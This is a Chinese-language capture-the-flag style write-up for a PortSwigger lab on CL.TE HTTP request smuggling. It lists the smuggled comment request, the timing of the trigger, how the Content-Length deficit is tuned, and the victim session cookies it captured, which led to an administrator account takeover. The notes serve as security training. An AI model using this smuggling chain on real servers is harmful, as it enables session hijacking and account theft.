---
title: lab-capture-other-users-requests
references:
- key: request-smuggling-family
  title: request-smuggling-family
---

# lab-capture-other-users-requests

> evidences: [[request-smuggling-family]]

- 题面:Exploiting HTTP request smuggling to capture other users' requests(`/web-security/request-smuggling/exploiting/lab-capture-other-users-requests`)
- 实例:`https://0a8d00dd04d4804680ca260300d3008d.web-security-academy.net`(批次 34,2026-10-06)
- 判定目标:走私使下一个用户的请求被存进应用,取出其 session 访问其账号;状态:**solved**

## 关键步(件:conn_reuse + race_send)

1. 前端不支持 chunked(CL.TE)。存储面 = 博客评论 `POST /post/comment`(需本人 session + csrf)。
2. **走私一条"未完成"的评论请求**,`comment=` 放在 body 末尾,CL 设成 `body.len()+deficit`;
   后端等 body 剩余字节,受害者随后的请求字节(含 `Cookie: session=<victim>`)被吞进 `comment` → 存成公开评论。
   - 走私请求须带**自己的** session+csrf(评论才被接受);deficit 决定能截到多长。
3. **触发**:受害者"每几个 POST 才发一次请求",且只有 POST 之后才动。
   流程 = ① 武装(deficit≈815)② `race_send --method POST --form search=… --n 4` 触发 ③ `nap ~7` ④ 读 `/post?postId=1`。
   - 关键窗口:deficit 必须 ≤ 受害者请求头块长度(实测该浏览器 ~815B);太小截不到 `Cookie`,太大则后端一直等 → 前端 `500 Communication timed out`。
4. 读评论得到受害者完整请求,含:`cookie: victim-fingerprint=…; secret=…; session=lulxHLL9IPjmyKQED13Ax2hPWVZhEoF3`。
5. 用该 session 建 jar 取 `/my-account` → `Your username is: administrator` → `solved_check` 翻牌。

## 证据摘录

```
conn_reuse <lab>/ --cl-te 'POST /post/comment HTTP/1.1\r\nHost: <lab>\r\nCookie: session=<ours>\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 903\r\n\r\ncsrf=<ours>&postId=1&name=b34&email=b@b.c&website=&comment=' --quiet
race_send <lab>/ --method POST --form search=b34t7 --n 4 --jar <jar>
# 读 /post?postId=1 出现评论:
#   GET / HTTP/1.1 … cookie: victim-fingerprint=…; secret=J0DVEHX953gRgyOieXtp1h1Alx1r0mT6; session=lulxHLL9IPjmyKQED13Ax2hPWVZhEoF3
lab_http get <lab>/my-account --jar <victim-jar>  -> "Your username is: administrator"
solved_check <lab>/ --jar <victim-jar> -> {"solved":true}
```

## 要点

- 受害者请求头块 ~815B(Chrome VICTIM UA,`cookie:` 在末尾);deficit 调参是收口关键,先 750(截到 `secret=`)再 815(完整)。
- 本 lab 前端**跨客户端连接复用后端连接**(两连接分工可行);`race_send` 的触发 POST 不会被算进 pending body(它们走了别的后端连接,回 200 正常首页)。
- 评论落库后读页即可,不需要 exploit server。

## R1 回归:走私链通过,账号步未收口

实例 `0a6f004c04e8508981183e9c00980092`。评论表单**匿名可用**(该实例登录按钮不用:weiner:peter 被拒,与 CSP 题不同);
`conn_reuse --cl-te 'POST /post/comment … Content-Length: 907(体 89B,deficit 818)'` arm 后,`race_send --method POST --form search=… --n 4` 触发,
`nap 8` 后读 `/post?postId=1`:评论正文 = 受害者**完整**请求(GET /,Victim UA),含
`cookie: victim-fingerprint=Hirh…; secret=mrIfq81Q9CN9JsFT8xXthGeBhP4W6H7G; session=cVHMhItbOxiUIynwJz86xT9fOxT3EiA`。

- **deficit 校准(可复现)**:815 → session 被截成 29 字符;818 → 完整 32 字符(= 受害者请求全长 818B);再大(1307)后端永不等满 → 无评论。
- **未收口**:该 session 单发 / +secret / +victim-fingerprint / 带 Victim UA 原始字节 / h1 与 h2 — `GET /my-account` 一律 302 `/login`,
  且响应会给回一个新 `session` cookie ⇒ 捕获到的受害者会话是**匿名**的,本实例 victim bot 似从未登录 ⇒ 拿不到 administrator。
- 与批次 34 的差异只在受害者会话是否已登录;走私链与 deficit 全部复现。
